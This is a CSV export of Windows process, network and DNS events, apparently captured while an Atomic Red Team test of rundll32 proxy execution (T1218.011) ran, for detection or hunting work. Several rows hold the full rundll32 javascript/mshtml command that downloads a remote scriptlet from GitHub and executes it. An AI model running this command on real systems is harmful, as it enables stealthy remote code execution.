"@timestamp","winlog.event_id","winlog.event_data.Image","winlog.event_data.ParentCommandLine","winlog.event_data.ProcessId","winlog.event_data.ParentProcessId","winlog.event_data.CommandLine","winlog.record_id"
"Aug 15, 2022 @ 15:27:40.837",22,"C:\Windows\System32\rundll32.exe",,5772,,,"171,578"
"Aug 15, 2022 @ 15:27:40.534",3,"C:\Windows\System32\rundll32.exe",,5772,,,"171,577"
"Aug 15, 2022 @ 15:27:39.037",1,"C:\Windows\System32\notepad.exe","rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();window.close();",1876,5772,"""C:\Windows\System32\notepad.exe"" ","171,573"
"Aug 15, 2022 @ 15:27:38.708",1,"C:\Windows\System32\rundll32.exe","""cmd.exe"" /c ""rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();window.close();""",5772,3180,"rundll32.exe  javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();window.close();","171,572"
"Aug 15, 2022 @ 15:27:38.682",1,"C:\Windows\System32\cmd.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",3180,7652,"""cmd.exe"" /c ""rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct"").Exec();window.close();""","171,571"
"Aug 15, 2022 @ 15:27:38.520",1,"C:\Windows\System32\whoami.exe","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",2052,7652,"""C:\Windows\system32\whoami.exe""","171,570"
"Aug 15, 2022 @ 15:27:38.506",1,"C:\Windows\System32\HOSTNAME.EXE","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",3884,7652,"""C:\Windows\system32\HOSTNAME.EXE""","171,569"
